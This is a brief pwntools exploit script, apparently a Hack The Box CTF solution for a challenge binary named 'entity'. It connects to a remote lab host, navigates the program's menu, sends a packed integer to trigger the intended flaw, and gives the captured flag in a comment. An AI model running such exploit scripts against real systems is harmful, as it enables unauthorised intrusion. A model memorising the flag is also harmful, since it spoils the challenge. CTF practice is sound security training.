from pwn import *


LOCAL = False
if LOCAL:
    r = process('./entity')
else:
    r = remote('206.189.28.151',30464)
    
r.recvuntil(">> ")
r.sendline("T")
r.recvuntil(">> ")
r.sendline("S")
r.recvuntil(">> ")
r.sendline(p64(13371337))
r.recvuntil(">> ")
r.sendline("C")
print(r.recvline())
#HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
